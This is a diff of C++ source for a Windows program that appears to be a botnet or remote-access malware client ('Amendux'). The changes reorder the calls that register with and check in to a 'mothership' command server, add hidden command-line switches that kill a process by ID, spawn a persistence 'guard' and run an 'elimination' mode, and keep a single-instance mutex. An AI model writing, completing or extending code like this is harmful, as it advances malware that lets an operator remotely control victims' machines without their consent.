@@ -4,6 +4,7 @@
 #include "Log.h"
 #include "Encrypt.h"
 #include "Config.h"
+#include "Process.h"
 #include "Candcel.h"
 #include "Resource.h"
 
@@ -22,8 +23,9 @@ WCHAR szWindowClass[MAX_LOADSTRING];            // The main window class name
 
 // Forward declarations of functions included in this code module:
 ATOM                MainRegisterClass(HINSTANCE hInstance);
-bool                InitInstance(HINSTANCE, int);
-bool                CleanupInstance();
+BOOL                InitInstance(HINSTANCE, int);
+BOOL                CleanupInstance();
+BOOL                ParseCommandLine();
 LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
 INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
 INT_PTR CALLBACK    Debug(HWND, UINT, WPARAM, LPARAM);
@@ -31,6 +33,11 @@ INT_PTR CALLBACK    Debug(HWND, UINT, WPARAM, LPARAM);
 int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
 {
     UNREFERENCED_PARAMETER(hPrevInstance);
+
+	// Parse commandline arguments
+	if (!ParseCommandLine()) {
+		return false;
+	}
 
     // Initialize global strings
     LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
@@ -45,19 +52,17 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
 	// Plant the seed
 	srand((unsigned int)time(NULL));
 
-	// Initialize and configure instance
+	// Initialize and configure modules
 	Amendux::Log::Init();
 	Amendux::Config::Init(FileCrypt);
-
-	// Establish communications with mothership
-	Commander.isAlive();
 
 	// Window accelerators
     HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WIN32PROJECT1));
 
-	// Notify mothership of our instance
+	// Establish communications with mothership
+	Commander.IsAlive();
 	Commander.Solicit();
-	Commander.CheckForUpdate();
+	// Commander.CheckForUpdate();
 
 	// Launch the guard
 	Amendux::Candcel::SpawnInterval(&Commander);
@@ -71,12 +76,15 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
         }
     }
 
+	// Terminate modules
+	Amendux::Log::Terminate();
+
 	// Perform application cleanup
 	if (!CleanupInstance()) {
 		return false;
 	}
 
-    return (int) msg.wParam;
+    return (int)msg.wParam;
 }
 
 
@@ -117,7 +125,7 @@ ATOM MainRegisterClass(HINSTANCE hInstance)
 //        In this function, we save the instance handle in a global variable and
 //        create and display the main program window.
 //
-bool InitInstance(HINSTANCE hInstance, int nCmdShow)
+BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
 {
    hInst = hInstance; // Store instance handle in our global variable
    hMutex = OpenMutex(MUTEX_ALL_ACCESS, 0, L"avcmtx");
@@ -125,6 +133,9 @@ bool InitInstance(HINSTANCE hInstance, int nCmdShow)
    if (!hMutex) {
 	   hMutex = CreateMutex(0, 0, L"avcmtx");
    } else {
+#if DEBUG
+	   MessageBox(NULL, L"Instance is already running", L"Instance", MB_OK | MB_ICONERROR);
+#endif
 	   return false;
    }
 
@@ -152,12 +163,73 @@ bool InitInstance(HINSTANCE hInstance, int nCmdShow)
 //        In this function, we save the instance handle in a global variable and
 //        create and display the main program window.
 //
-bool CleanupInstance()
+BOOL CleanupInstance()
 {
 	ReleaseMutex(hMutex);
 
 	return true;
 }
+
+
+//
+//   FUNCTION: ParseCommandLine()
+//
+//   PURPOSE: Saves instance handle and creates main window
+//
+//   COMMENTS:
+//
+//        In this function, we save the instance handle in a global variable and
+//        create and display the main program window.
+//
+BOOL ParseCommandLine()
+{
+	LPWSTR *szArgList;
+	int argCount;
+	bool bContinueExec = true;
+
+	szArgList = CommandLineToArgvW(GetCommandLine(), &argCount);
+	if (!szArgList || argCount < 1) {
+		return false;
+	}
+
+	for (int i = 1; i < argCount; i++) {
+		WCHAR *szCmd = szArgList[i];
+
+		// Run update mode
+		if ((!wcscmp(szCmd, L"/nu") || !wcscmp(szCmd, L"/NU")) && argCount > 2) {
+			unsigned int pid = _wtoi(szArgList[i + 1]);
+			if (pid < 1) {
+				continue;
+			}
+
+			// MessageBox(NULL, (std::wstring(L"Update process running => ") + szArgList[i + 1]).c_str(), L"Update", MB_OK);
+			Amendux::Process::KillProcessId(pid);
+			cfg.DisableUpdate();
+		}
+
+		// Spawn a guard
+		if (!wcscmp(szCmd, L"/sg") || !wcscmp(szCmd, L"/SG")) {
+#if DEBUG
+			MessageBox(NULL, L"Spwan guard [TODO]", L"Guard", MB_OK);
+#endif
+			bContinueExec = false;
+		}
+
+		// Run elimination mode
+		if ((!wcscmp(szCmd, L"/el") || !wcscmp(szCmd, L"/EL")) && argCount > 2) {
+#if DEBUG
+			MessageBox(NULL, L"Eliminate instance [TODO]", L"Eliminate", MB_OK);
+#endif
+			bContinueExec = false;
+		}
+
+	}
+
+	LocalFree(szArgList);
+
+	return bContinueExec;
+}
+
 
 //
 //  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
